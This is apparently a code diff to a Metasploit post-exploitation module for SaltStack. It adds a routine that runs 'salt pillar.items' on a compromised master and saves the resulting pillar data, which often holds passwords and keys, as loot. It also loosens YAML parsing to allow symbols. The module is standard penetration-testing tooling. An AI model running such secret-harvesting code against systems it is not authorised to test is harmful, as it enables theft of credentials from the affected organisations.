@@ -32,6 +32,22 @@ class MetasploitModule < Msf::Post
     )
   end
 
+  def gather_pillars
+    print_status('Gathering pillar data')
+    begin
+      out = cmd_exec("salt '#{datastore['MINIONS']}' --output=yaml pillar.items")
+      vprint_status(out)
+      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
+      store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Pillar Gather')
+      print_good("#{peer} - pillar data gathering successfully retrieved and saved on #{store_path}")
+    rescue Psych::SyntaxError
+      print_error('Unable to process pillar command output')
+      return
+    end
+    puts results
+    # do some processing?
+  end
+
   def gather_minion_data
     print_status('Gathering data from minions')
     command = []
@@ -50,7 +66,7 @@ class MetasploitModule < Msf::Post
     begin
       out = cmd_exec(command)
       vprint_status(out)
-      results = YAML.safe_load(out)
+      results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
       store_path = store_loot('saltstack_minion_data_gather', 'application/x-yaml', session, results.to_yaml, 'minion_data_gather.yaml', 'SaltStack Minion Data Gather')
       print_good("#{peer} - minion data gathering successfully retrieved and saved on #{store_path}")
     rescue Psych::SyntaxError
@@ -226,6 +242,7 @@ class MetasploitModule < Msf::Post
       store_path = store_loot('saltstack_roster', 'application/x-yaml', session, minion.to_yaml, 'roster.yaml', 'SaltStack Roster File')
       print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
     end
+    gather_pillars
   end
 
   def run
